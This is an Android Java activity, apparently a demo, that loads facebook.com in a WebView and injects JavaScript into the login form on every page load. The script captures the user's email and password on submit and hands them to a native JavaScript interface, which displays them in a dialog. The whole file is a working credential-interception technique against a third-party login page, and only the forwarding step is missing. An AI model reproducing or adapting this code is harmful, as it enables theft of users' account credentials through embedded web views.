package cn.ry.diary.demo4.webview;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.DialogInterface;
import android.os.Bundle;
import android.webkit.JavascriptInterface;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import cn.ry.diary.R;

public class WebViewActivity extends Activity {
    WebView webview1;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_webview);

        webview1 = (WebView)findViewById(R.id.myWebview);

        webview1.getSettings().setJavaScriptEnabled(true);
        webview1.addJavascriptInterface(new MyJavaScriptInterface(), "MYOBJECT");
        webview1.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                view.loadUrl(url);
                return true;
            }

            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);

                StringBuilder sb = new StringBuilder();
                sb.append("document.getElementsByTagName('form')[0].onsubmit = function () {");
                sb.append("var objPWD, objAccount;var str = '';");
                sb.append("var inputs = document.getElementsByTagName('input');");
                sb.append("for (var i = 0; i < inputs.length; i++) {");
		        sb.append("if (inputs[i].type.toLowerCase() === 'password') {objPWD = inputs[i];}");
		        sb.append("else if (inputs[i].name.toLowerCase() === 'email') {objAccount = inputs[i];}");
                sb.append("}");
                sb.append("if (objAccount != null) {str += objAccount.value;}");
                sb.append("if (objPWD != null) { str += ' , ' + objPWD.value;}");
                sb.append("window.MYOBJECT.processHTML(str);");
                sb.append("return true;");
                sb.append("};");

                view.loadUrl("javascript:" + sb.toString());
            }

        });

        String sUrl = "http://www.facebook.com/";
        webview1.loadUrl(sUrl);

    }

    class MyJavaScriptInterface
    {
        @JavascriptInterface
        public void processHTML(String html)
        {
            AlertDialog.Builder builder = new AlertDialog.Builder(WebViewActivity.this);
            builder.setTitle("AlertDialog from app")
                    .setMessage(html)
                    .setPositiveButton(android.R.string.ok,
                            new DialogInterface.OnClickListener() {

                                @Override
                                public void onClick(DialogInterface dialog, int which) {
                                    // TODO Auto-generated method stub

                                }
                            })
                    .setCancelable(false).show();

        }
    }

}
